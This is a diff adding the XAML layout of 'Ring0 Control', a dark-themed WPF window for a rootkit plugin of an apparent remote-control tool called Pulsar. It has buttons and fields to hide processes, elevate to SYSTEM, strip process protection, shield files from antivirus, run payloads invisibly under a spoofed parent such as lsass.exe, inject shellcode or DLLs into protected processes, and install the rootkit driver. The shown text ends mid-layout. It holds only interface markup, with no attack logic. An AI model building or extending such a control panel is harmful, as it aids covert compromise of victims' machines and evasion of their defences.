@@ -1,0 +1,948 @@
+<Window x:Class="Pulsar.Plugin.Ring0.Server.RootkitWindow"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Title="Ring0 Control" 
+        Width="1000" Height="900" MinHeight="750" MinWidth="900"
+        WindowStartupLocation="CenterScreen"
+        Background="#1E1E1E"
+        Foreground="#DCDCDC"
+        ResizeMode="CanResize">
+
+    <Window.Resources>
+        <!-- Dark Theme Colors -->
+        <SolidColorBrush x:Key="BgDark" Color="#1E1E1E"/>
+        <SolidColorBrush x:Key="BgPanel" Color="#2D2D30"/>
+        <SolidColorBrush x:Key="BgButton" Color="#3C3C41"/>
+        <SolidColorBrush x:Key="BgButtonHover" Color="#505055"/>
+        <SolidColorBrush x:Key="BgTextBox" Color="#252526"/>
+        <SolidColorBrush x:Key="BorderBrush" Color="#434346"/>
+        <SolidColorBrush x:Key="FgText" Color="#DCDCDC"/>
+        <SolidColorBrush x:Key="AccentPurple" Color="#9370DB"/>
+        <SolidColorBrush x:Key="SuccessGreen" Color="#57A64A"/>
+        <SolidColorBrush x:Key="ErrorRed" Color="#CF6679"/>
+        <SolidColorBrush x:Key="WarningYellow" Color="#DCA032"/>
+        <SolidColorBrush x:Key="DangerRed" Color="#D32F2F"/>
+
+        <!-- Button Style -->
+        <Style x:Key="DarkButton" TargetType="Button">
+            <Setter Property="Background" Value="{StaticResource BgButton}"/>
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Padding" Value="15,8"/>
+            <Setter Property="Margin" Value="3"/>
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="Cursor" Value="Hand"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="Button">
+                        <Border Background="{TemplateBinding Background}" 
+                                BorderBrush="{TemplateBinding BorderBrush}" 
+                                BorderThickness="{TemplateBinding BorderThickness}"
+                                CornerRadius="3"
+                                Padding="{TemplateBinding Padding}">
+                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
+                        </Border>
+                        <ControlTemplate.Triggers>
+                            <Trigger Property="IsMouseOver" Value="True">
+                                <Setter Property="Background" Value="{StaticResource BgButtonHover}"/>
+                            </Trigger>
+                            <Trigger Property="IsEnabled" Value="False">
+                                <Setter Property="Opacity" Value="0.5"/>
+                            </Trigger>
+                        </ControlTemplate.Triggers>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+        </Style>
+
+        <!-- Accent Button Style (Purple - for action buttons) -->
+        <Style x:Key="AccentButton" TargetType="Button" BasedOn="{StaticResource DarkButton}">
+            <Setter Property="Background" Value="#5D4A7A"/>
+            <Setter Property="BorderBrush" Value="#9370DB"/>
+            <Style.Triggers>
+                <Trigger Property="IsMouseOver" Value="True">
+                    <Setter Property="Background" Value="#7D6A9A"/>
+                </Trigger>
+            </Style.Triggers>
+        </Style>
+
+        <!-- Danger Button Style (Red - ONLY for delete/remove/irreversible) -->
+        <Style x:Key="DangerButton" TargetType="Button" BasedOn="{StaticResource DarkButton}">
+            <Setter Property="Background" Value="#5D1A1A"/>
+            <Setter Property="BorderBrush" Value="#8B2525"/>
+            <Style.Triggers>
+                <Trigger Property="IsMouseOver" Value="True">
+                    <Setter Property="Background" Value="#7D2A2A"/>
+                </Trigger>
+            </Style.Triggers>
+        </Style>
+
+        <!-- TextBox Style -->
+        <Style x:Key="DarkTextBox" TargetType="TextBox">
+            <Setter Property="Background" Value="{StaticResource BgTextBox}"/>
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Padding" Value="8,6"/>
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="CaretBrush" Value="{StaticResource FgText}"/>
+        </Style>
+
+        <!-- ComboBox Styles -->
+        <Style x:Key="DarkComboBoxItem" TargetType="ComboBoxItem">
+            <Setter Property="Background" Value="#252526"/>
+            <Setter Property="Foreground" Value="#DCDCDC"/>
+            <Setter Property="Padding" Value="8,6"/>
+            <Style.Triggers>
+                <Trigger Property="IsMouseOver" Value="True">
+                    <Setter Property="Background" Value="#3E3E42"/>
+                </Trigger>
+                <Trigger Property="IsSelected" Value="True">
+                    <Setter Property="Background" Value="#9370DB"/>
+                </Trigger>
+            </Style.Triggers>
+        </Style>
+
+        <!-- ComboBox Toggle Button Template -->
+        <ControlTemplate x:Key="ComboBoxToggleButton" TargetType="ToggleButton">
+            <Grid>
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition/>
+                    <ColumnDefinition Width="20"/>
+                </Grid.ColumnDefinitions>
+                <Border x:Name="Border" Grid.ColumnSpan="2" Background="#252526" BorderBrush="#434346" BorderThickness="1" CornerRadius="3"/>
+                <Border Grid.Column="0" Background="#252526" BorderBrush="#434346" BorderThickness="0,0,1,0" CornerRadius="3,0,0,3" Margin="1"/>
+                <Path x:Name="Arrow" Grid.Column="1" Fill="#DCDCDC" HorizontalAlignment="Center" VerticalAlignment="Center" Data="M 0 0 L 4 4 L 8 0 Z"/>
+            </Grid>
+            <ControlTemplate.Triggers>
+                <Trigger Property="IsMouseOver" Value="True">
+                    <Setter TargetName="Border" Property="Background" Value="#3E3E42"/>
+                </Trigger>
+            </ControlTemplate.Triggers>
+        </ControlTemplate>
+
+        <!-- ComboBox Full Template -->
+        <Style x:Key="DarkComboBox" TargetType="ComboBox">
+            <Setter Property="Background" Value="#252526"/>
+            <Setter Property="Foreground" Value="#DCDCDC"/>
+            <Setter Property="BorderBrush" Value="#434346"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Padding" Value="8,6"/>
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="ItemContainerStyle" Value="{StaticResource DarkComboBoxItem}"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="ComboBox">
+                        <Grid>
+                            <ToggleButton Name="ToggleButton" Template="{StaticResource ComboBoxToggleButton}"
+                                          IsChecked="{Binding Path=IsDropDownOpen, Mode=TwoWay, RelativeSource={RelativeSource TemplatedParent}}"
+                                          Focusable="False" ClickMode="Press"/>
+                            <ContentPresenter x:Name="ContentSite" IsHitTestVisible="False" 
+                                              Content="{TemplateBinding SelectionBoxItem}"
+                                              ContentTemplate="{TemplateBinding SelectionBoxItemTemplate}"
+                                              ContentTemplateSelector="{TemplateBinding ItemTemplateSelector}"
+                                              Margin="10,3,30,3" VerticalAlignment="Center" HorizontalAlignment="Left">
+                                <ContentPresenter.Resources>
+                                    <Style TargetType="TextBlock">
+                                        <Setter Property="Foreground" Value="#DCDCDC"/>
+                                    </Style>
+                                </ContentPresenter.Resources>
+                            </ContentPresenter>
+                            <TextBox x:Name="PART_EditableTextBox"
+                                     Style="{x:Null}"
+                                     Background="Transparent"
+                                     Foreground="#DCDCDC"
+                                     CaretBrush="#DCDCDC"
+                                     BorderThickness="0"
+                                     Margin="10,3,30,3"
+                                     VerticalAlignment="Center"
+                                     HorizontalAlignment="Left"
+                                     Focusable="True"
+                                     Visibility="Hidden"
+                                     IsReadOnly="{TemplateBinding IsReadOnly}"/>
+                            <Popup Name="Popup" Placement="Bottom" IsOpen="{TemplateBinding IsDropDownOpen}" 
+                                   AllowsTransparency="True" Focusable="False" PopupAnimation="Slide">
+                                <Grid Name="DropDown" SnapsToDevicePixels="True" MinWidth="{TemplateBinding ActualWidth}" MaxHeight="{TemplateBinding MaxDropDownHeight}">
+                                    <Border x:Name="DropDownBorder" Background="#252526" BorderThickness="1" BorderBrush="#434346" CornerRadius="3"/>
+                                    <ScrollViewer Margin="4,6,4,6" SnapsToDevicePixels="True">
+                                        <StackPanel IsItemsHost="True" KeyboardNavigation.DirectionalNavigation="Contained"/>
+                                    </ScrollViewer>
+                                </Grid>
+                            </Popup>
+                        </Grid>
+                        <ControlTemplate.Triggers>
+                            <Trigger Property="IsEditable" Value="True">
+                                <Setter TargetName="PART_EditableTextBox" Property="Visibility" Value="Visible"/>
+                                <Setter TargetName="ContentSite" Property="Visibility" Value="Hidden"/>
+                            </Trigger>
+                        </ControlTemplate.Triggers>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+        </Style>
+
+
+        <!-- GroupBox Style -->
+        <Style x:Key="DarkGroupBox" TargetType="GroupBox">
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="Margin" Value="5"/>
+            <Setter Property="Padding" Value="10"/>
+            <Setter Property="FontSize" Value="13"/>
+        </Style>
+
+        <!-- Label Style -->
+        <Style TargetType="Label">
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="VerticalAlignment" Value="Center"/>
+        </Style>
+
+        <!-- TabControl Style -->
+        <Style x:Key="DarkTabControl" TargetType="TabControl">
+            <Setter Property="Background" Value="Transparent"/>
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+        </Style>
+
+        <Style x:Key="DarkTabItem" TargetType="TabItem">
+            <Setter Property="Background" Value="{StaticResource BgButton}"/>
+            <Setter Property="Foreground" Value="{StaticResource FgText}"/>
+            <Setter Property="BorderBrush" Value="{StaticResource BorderBrush}"/>
+            <Setter Property="Padding" Value="20,10"/>
+            <Setter Property="FontSize" Value="14"/>
+            <Setter Property="FontWeight" Value="SemiBold"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="TabItem">
+                        <Border x:Name="Border" Background="{StaticResource BgButton}" 
+                                BorderBrush="{StaticResource BorderBrush}" BorderThickness="1,1,1,0"
+                                Margin="2,0,2,0" Padding="{TemplateBinding Padding}" CornerRadius="5,5,0,0">
+                            <ContentPresenter ContentSource="Header" HorizontalAlignment="Center"/>
+                        </Border>
+                        <ControlTemplate.Triggers>
+                            <!-- Selected tab gets purple background -->
+                            <Trigger Property="IsSelected" Value="True">
+                                <Setter TargetName="Border" Property="Background" Value="{StaticResource AccentPurple}"/>
+                            </Trigger>
+                            <!-- Hover effect ONLY when not selected -->
+                            <MultiTrigger>
+                                <MultiTrigger.Conditions>
+                                    <Condition Property="IsMouseOver" Value="True"/>
+                                    <Condition Property="IsSelected" Value="False"/>
+                                </MultiTrigger.Conditions>
+                                <Setter TargetName="Border" Property="Background" Value="{StaticResource BgButtonHover}"/>
+                            </MultiTrigger>
+                        </ControlTemplate.Triggers>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+        </Style>
+
+        <!-- Modern Sleek ScrollBar Styles -->
+        <Style x:Key="SlimScrollBarThumb" TargetType="Thumb">
+            <Setter Property="OverridesDefaultStyle" Value="True"/>
+            <Setter Property="IsTabStop" Value="False"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="Thumb">
+                        <Border x:Name="ThumbBorder" 
+                                Background="#50808080" 
+                                CornerRadius="3"
+                                Margin="1"/>
+                        <ControlTemplate.Triggers>
+                            <Trigger Property="IsMouseOver" Value="True">
+                                <Setter TargetName="ThumbBorder" Property="Background" Value="#80808080"/>
+                            </Trigger>
+                            <Trigger Property="IsDragging" Value="True">
+                                <Setter TargetName="ThumbBorder" Property="Background" Value="#A09370DB"/>
+                            </Trigger>
+                        </ControlTemplate.Triggers>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+        </Style>
+
+        <Style x:Key="SlimScrollBarPageButton" TargetType="RepeatButton">
+            <Setter Property="OverridesDefaultStyle" Value="True"/>
+            <Setter Property="Background" Value="Transparent"/>
+            <Setter Property="Focusable" Value="False"/>
+            <Setter Property="IsTabStop" Value="False"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="RepeatButton">
+                        <Rectangle Fill="Transparent"/>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+        </Style>
+
+        <Style TargetType="ScrollBar">
+            <Setter Property="OverridesDefaultStyle" Value="True"/>
+            <Setter Property="Background" Value="Transparent"/>
+            <Setter Property="Width" Value="8"/>
+            <Setter Property="MinWidth" Value="8"/>
+            <Setter Property="Template">
+                <Setter.Value>
+                    <ControlTemplate TargetType="ScrollBar">
+                        <Grid x:Name="GridRoot" Width="8" Background="Transparent">
+                            <Track x:Name="PART_Track" IsDirectionReversed="True" Focusable="False">
+                                <Track.DecreaseRepeatButton>
+                                    <RepeatButton Command="ScrollBar.PageUpCommand" Style="{StaticResource SlimScrollBarPageButton}"/>
+                                </Track.DecreaseRepeatButton>
+                                <Track.Thumb>
+                                    <Thumb Style="{StaticResource SlimScrollBarThumb}"/>
+                                </Track.Thumb>
+                                <Track.IncreaseRepeatButton>
+                                    <RepeatButton Command="ScrollBar.PageDownCommand" Style="{StaticResource SlimScrollBarPageButton}"/>
+                                </Track.IncreaseRepeatButton>
+                            </Track>
+                        </Grid>
+                        <ControlTemplate.Triggers>
+                            <Trigger Property="IsMouseOver" Value="True">
+                                <Setter TargetName="GridRoot" Property="Width" Value="10"/>
+                            </Trigger>
+                        </ControlTemplate.Triggers>
+                    </ControlTemplate>
+                </Setter.Value>
+            </Setter>
+            <Style.Triggers>
+                <Trigger Property="Orientation" Value="Horizontal">
+                    <Setter Property="Width" Value="Auto"/>
+                    <Setter Property="MinWidth" Value="0"/>
+                    <Setter Property="Height" Value="8"/>
+                    <Setter Property="MinHeight" Value="8"/>
+                    <Setter Property="Template">
+                        <Setter.Value>
+                            <ControlTemplate TargetType="ScrollBar">
+                                <Grid x:Name="GridRoot" Height="8" Background="Transparent">
+                                    <Track x:Name="PART_Track" IsDirectionReversed="False" Focusable="False">
+                                        <Track.DecreaseRepeatButton>
+                                            <RepeatButton Command="ScrollBar.PageLeftCommand" Style="{StaticResource SlimScrollBarPageButton}"/>
+                                        </Track.DecreaseRepeatButton>
+                                        <Track.Thumb>
+                                            <Thumb Style="{StaticResource SlimScrollBarThumb}"/>
+                                        </Track.Thumb>
+                                        <Track.IncreaseRepeatButton>
+                                            <RepeatButton Command="ScrollBar.PageRightCommand" Style="{StaticResource SlimScrollBarPageButton}"/>
+                                        </Track.IncreaseRepeatButton>
+                                    </Track>
+                                </Grid>
+                            </ControlTemplate>
+                        </Setter.Value>
+                    </Setter>
+                </Trigger>
+            </Style.Triggers>
+        </Style>
+    </Window.Resources>
+
+    <Grid Margin="15">
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="180"/>
+        </Grid.RowDefinitions>
+
+        <!-- Status Panel -->
+        <Border Grid.Row="0" Background="{StaticResource BgPanel}" BorderBrush="{StaticResource BorderBrush}" 
+                BorderThickness="1" CornerRadius="5" Padding="20,15" Margin="0,0,0,10">
+            <Grid>
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="*"/>
+                    <ColumnDefinition Width="*"/>
+                    <ColumnDefinition Width="Auto"/>
+                </Grid.ColumnDefinitions>
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="Auto"/>
+                    <RowDefinition Height="Auto"/>
+                    <RowDefinition Height="Auto"/>
+                </Grid.RowDefinitions>
+
+                <TextBlock x:Name="lblConnStatus" Grid.Column="0" Grid.Row="0" 
+                           Text="○ Rootkit Not Connected" FontSize="16" FontWeight="Bold" 
+                           Foreground="{StaticResource ErrorRed}"/>
+                <TextBlock x:Name="lblDriverStatus" Grid.Column="0" Grid.Row="1" 
+                           Text="Driver: Not Loaded" FontSize="13" Margin="0,5,0,0"/>
+                <TextBlock x:Name="lblBuildStatus" Grid.Column="0" Grid.Row="2" 
+                           Text="Build: Unknown" FontSize="13" Margin="0,5,0,0"/>
+
+                <TextBlock x:Name="lblDseStatus" Grid.Column="1" Grid.Row="0" 
+                           Text="DSE: Unknown" FontSize="14"/>
+                <TextBlock x:Name="lblSecureBootStatus" Grid.Column="1" Grid.Row="1" 
+                           Text="Secure Boot: Unknown" FontSize="13" Margin="0,5,0,0"/>
+                <TextBlock x:Name="lblCompatStatus" Grid.Column="1" Grid.Row="2" 
+                           Text="Compatibility: Unknown" FontSize="13" Margin="0,5,0,0"/>
+
+                <Button x:Name="btnCompatCheck" Grid.Column="2" Grid.RowSpan="3" 
+                        Content="Check&#x0a;Compatibility" Style="{StaticResource DarkButton}" 
+                        Width="100" Height="60" VerticalAlignment="Center" Margin="10,0,0,0"
+                        Click="BtnCompatCheck_Click"/>
+            </Grid>
+        </Border>
+
+        <!-- Tab Control -->
+        <TabControl Grid.Row="1" Style="{StaticResource DarkTabControl}" Background="Transparent" BorderThickness="0">
+            
+            <!-- ==================== MAIN TAB ==================== -->
+            <TabItem Header="Main" Style="{StaticResource DarkTabItem}">
+                <ScrollViewer VerticalScrollBarVisibility="Auto">
+                    <StackPanel Margin="5">
+                        
+                        <!-- Process Operations & Protection -->
+                        <Grid Margin="0,10,0,0">
+                            <Grid.ColumnDefinitions>
+                                <ColumnDefinition Width="*"/>
+                                <ColumnDefinition Width="*"/>
+                            </Grid.ColumnDefinitions>
+
+                            <GroupBox Grid.Column="0" Header="Process Operations" Style="{StaticResource DarkGroupBox}" Margin="0,0,5,0">
+                                <StackPanel>
+                                    <Grid Margin="0,0,0,10">
+                                        <Grid.ColumnDefinitions>
+                                            <ColumnDefinition Width="60"/>
+                                            <ColumnDefinition Width="*"/>
+                                        </Grid.ColumnDefinitions>
+                                        <Label Content="PID:"/>
+                                        <TextBox x:Name="txtPid" Grid.Column="1" Style="{StaticResource DarkTextBox}" Width="180" HorizontalAlignment="Left"/>
+                                    </Grid>
+                                    <WrapPanel>
+                                        <Button x:Name="btnHideProcess" Content="Hide Process" Style="{StaticResource DarkButton}" Width="200" Click="BtnHideProcess_Click"/>
+                                        <Button x:Name="btnElevateProcess" Content="Elevate to SYSTEM" Style="{StaticResource DarkButton}" Width="200" Click="BtnElevateProcess_Click"/>
+                                    </WrapPanel>
+                                    <WrapPanel Margin="0,5,0,0">
+                                        <Button x:Name="btnUnprotectAll" Content="Unprotect All Processes" Style="{StaticResource DarkButton}" Width="200" Click="BtnUnprotectAll_Click"/>
+                                    </WrapPanel>
+                                </StackPanel>
+                            </GroupBox>
+
+                            <GroupBox Grid.Column="1" Header="Process Protection" Style="{StaticResource DarkGroupBox}" Margin="5,0,0,0">
+                                <Grid>
+                                    <Grid.RowDefinitions>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                    </Grid.RowDefinitions>
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="70"/>
+                                        <ColumnDefinition Width="*"/>
+                                        <ColumnDefinition Width="Auto"/>
+                                    </Grid.ColumnDefinitions>
+
+                                    <Label Content="PID:" Grid.Row="0"/>
+                                    <TextBox x:Name="txtProtPid" Grid.Row="0" Grid.Column="1" Style="{StaticResource DarkTextBox}" Margin="0,0,10,5"/>
+
+                                    <Label Content="Type:" Grid.Row="1"/>
+                                    <ComboBox x:Name="cboProtType" Grid.Row="1" Grid.Column="1" Style="{StaticResource DarkComboBox}" Margin="0,0,10,5" SelectedIndex="0">
+                                        <ComboBoxItem Content="None (Remove)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Protected Light" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Protected" Foreground="#DCDCDC"/>
+                                    </ComboBox>
+
+                                    <Label Content="Signer:" Grid.Row="2"/>
+                                    <ComboBox x:Name="cboProtSigner" Grid.Row="2" Grid.Column="1" Style="{StaticResource DarkComboBox}" Margin="0,0,10,0" SelectedIndex="0">
+                                        <ComboBoxItem Content="None" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Authenticode" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="CodeGen" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Antimalware" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Lsa" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Windows" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="WinTcb" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="WinSystem" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="App" Foreground="#DCDCDC"/>
+                                    </ComboBox>
+
+                                    <Button x:Name="btnSetProtection" Grid.Column="2" Grid.RowSpan="3" Content="Set Protection" 
+                                            Style="{StaticResource DarkButton}" Width="120" Click="BtnSetProtection_Click"/>
+                                </Grid>
+                            </GroupBox>
+                        </Grid>
+
+                        <!-- File Operations -->
+                        <GroupBox Header="File Operations" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <Grid Margin="0,0,0,10">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="80"/>
+                                        <ColumnDefinition Width="*"/>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="80"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Label Content="File Path:"/>
+                                    <TextBox x:Name="txtFilename" Grid.Column="1" Style="{StaticResource DarkTextBox}" Margin="0,0,10,0"/>
+                                    <Label Content="Allowed PID:" Grid.Column="2"/>
+                                    <TextBox x:Name="txtAllowedPid" Grid.Column="3" Style="{StaticResource DarkTextBox}"/>
+                                </Grid>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnRestrictFile" Content="Restrict File Access" Style="{StaticResource DarkButton}" Width="180" Click="BtnRestrictFile_Click"/>
+                                    <Button x:Name="btnBypassIntegrity" Content="Bypass Integrity Check" Style="{StaticResource DarkButton}" Width="180" Click="BtnBypassIntegrity_Click"/>
+                                    <Button x:Name="btnProtectAV" Content="Protect File Against AV" Style="{StaticResource DarkButton}" Width="180" Click="BtnProtectAV_Click"/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- Invisible Process Execution -->
+                        <GroupBox Header="Invisible Process Execution" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Run processes invisible to Task Manager, Process Explorer, and other monitoring tools." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <Grid Margin="0,0,0,10">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="*"/>
+                                        <ColumnDefinition Width="Auto"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Grid.RowDefinitions>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                    </Grid.RowDefinitions>
+                                    
+                                    <Label Content="Payload Type:" Grid.Row="0"/>
+                                    <ComboBox x:Name="cboHiddenPayloadType" Grid.Row="0" Grid.Column="1" Grid.ColumnSpan="2" Style="{StaticResource DarkComboBox}" 
+                                              SelectedIndex="0" Margin="0,0,0,5"
+                                              ToolTip="Select the type of payload to execute">
+                                        <ComboBoxItem Content="Executable (.exe)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Batch Script (.bat)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="PowerShell (.ps1)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="DLL Injection" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Shellcode" Foreground="#DCDCDC"/>
+                                    </ComboBox>
+                                    
+                                    <Label Content="Payload:" Grid.Row="1"/>
+                                    <TextBox x:Name="txtHiddenPath" Grid.Row="1" Grid.Column="1" Style="{StaticResource DarkTextBox}" 
+                                             Margin="0,0,5,5" ToolTip="Full path to the payload file on client, or browse to upload from server"/>
+                                    <Button x:Name="btnBrowsePayload" Content="Browse..." Grid.Row="1" Grid.Column="2" Style="{StaticResource DarkButton}"
+                                            Click="BtnBrowsePayload_Click" ToolTip="Select a file from YOUR machine to upload to the client" Padding="10,6"/>
+                                    
+                                    <Label Content="Arguments:" Grid.Row="2"/>
+                                    <TextBox x:Name="txtHiddenArgs" Grid.Row="2" Grid.Column="1" Grid.ColumnSpan="2" Style="{StaticResource DarkTextBox}" 
+                                             Margin="0,0,0,5" ToolTip="Command line arguments (optional)"/>
+                                    
+                                    <Label Content="Fake Parent:" Grid.Row="3"/>
+                                    <ComboBox x:Name="cboHiddenParent" Grid.Row="3" Grid.Column="1" Grid.ColumnSpan="2" Style="{StaticResource DarkComboBox}" 
+                                              SelectedIndex="0" ToolTip="Spoof parent process to avoid detection">
+                                        <ComboBoxItem Content="None (no spoofing)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="explorer.exe" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="svchost.exe" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="services.exe" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="lsass.exe" Foreground="#DCDCDC"/>
+                                    </ComboBox>
+                                </Grid>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnRunHidden" Content="▶ Run Hidden" Style="{StaticResource AccentButton}" Width="140" Click="BtnRunHidden_Click"
+                                            ToolTip="Launch the payload as a completely invisible process"/>
+                                    <Button x:Name="btnListHidden" Content="📋 List Hidden" Style="{StaticResource DarkButton}" Width="140" Click="BtnListHidden_Click"
+                                            ToolTip="List all currently hidden processes"/>
+                                    <Button x:Name="btnKillHidden" Content="✕ Kill Hidden" Style="{StaticResource DangerButton}" Width="140" Click="BtnKillHidden_Click"
+                                            ToolTip="Terminate a hidden process by PID"/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- PPL Injection -->
+                        <GroupBox Header="PPL Injection (Protected Processes)" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <TextBlock Text="Inject code into Protected Process Light (PPL) processes like lsass, csrss, smss." 
+                                           Foreground="#888" Margin="0,0,0,10" TextWrapping="Wrap"/>
+                                <Grid Margin="0,0,0,10">
+                                    <Grid.ColumnDefinitions>
+                                        <ColumnDefinition Width="100"/>
+                                        <ColumnDefinition Width="*"/>
+                                    </Grid.ColumnDefinitions>
+                                    <Grid.RowDefinitions>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                        <RowDefinition Height="Auto"/>
+                                    </Grid.RowDefinitions>
+                                    
+                                    <Label Content="Target:" Grid.Row="0"/>
+                                    <ComboBox x:Name="cboPplTarget" Grid.Row="0" Grid.Column="1" Style="{StaticResource DarkComboBox}" 
+                                              SelectedIndex="0" Margin="0,0,0,5" IsEditable="True"
+                                              ToolTip="Select a protected process from presets or type a custom PID/name">
+                                        <ComboBoxItem Content="csrss.exe" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="lsass.exe" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="smss.exe" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="services.exe" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="wininit.exe" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="svchost.exe" Foreground="#DCDCDC"/>
+                                    </ComboBox>
+                                    
+                                    <Label Content="Payload:" Grid.Row="1"/>
+                                    <ComboBox x:Name="cboPplPayload" Grid.Row="1" Grid.Column="1" Style="{StaticResource DarkComboBox}" 
+                                              SelectedIndex="0" Margin="0,0,0,5"
+                                              ToolTip="Type of payload to inject">
+                                        <ComboBoxItem Content="EXE (Execute)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="BAT (Batch Script)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="PS1 (PowerShell)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="DLL (LoadLibrary)" Foreground="#DCDCDC"/>
+                                        <ComboBoxItem Content="Shellcode" Foreground="#DCDCDC"/>
+                                    </ComboBox>
+                                    
+                                    <Label Content="Payload:" Grid.Row="2"/>
+                                    <Grid Grid.Row="2" Grid.Column="1">
+                                        <Grid.ColumnDefinitions>
+                                            <ColumnDefinition Width="*"/>
+                                            <ColumnDefinition Width="Auto"/>
+                                        </Grid.ColumnDefinitions>
+                                        <TextBox x:Name="txtPplDllPath" Style="{StaticResource DarkTextBox}"
+                                                 ToolTip="Path to payload file (EXE, BAT, PS1, DLL, or shellcode)"/>
+                                        <Button x:Name="btnBrowsePpl" Content="Browse..." Style="{StaticResource DarkButton}" 
+                                                Grid.Column="1" Width="80" Margin="5,0,0,0" Click="BtnBrowsePpl_Click"
+                                                ToolTip="Browse and select payload file from server"/>
+                                    </Grid>
+                                </Grid>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button x:Name="btnInjectPpl" Content="💉 Inject into PPL" Style="{StaticResource DangerButton}" Width="180" Click="BtnInjectPpl_Click"
+                                            ToolTip="Unprotect the PPL and inject the payload. The process protection is removed during injection."/>
+                                </WrapPanel>
+                            </StackPanel>
+                        </GroupBox>
+
+                        <!-- Driver Operations -->
+                        <GroupBox Header="Driver Operations" Style="{StaticResource DarkGroupBox}">
+                            <StackPanel>
+                                <WrapPanel HorizontalAlignment="Center">
+                                    <Button Content="Connect" Style="{StaticResource DarkButton}" Width="140" Click="BtnConnect_Click"/>
+                                    <Button Content="Install Rootkit" Style="{StaticResource DarkButton}" Width="140" Click="BtnInstall_Click"/>
+                                    <Button Content="Uninstall" Style="{StaticResource DarkButton}" Width="140" Click="BtnUninstall_Click"/>
+                                    <Button Content="Refresh Status" Style="{StaticResource DarkButton}" Width="140" Click="BtnRefresh_Click"/>
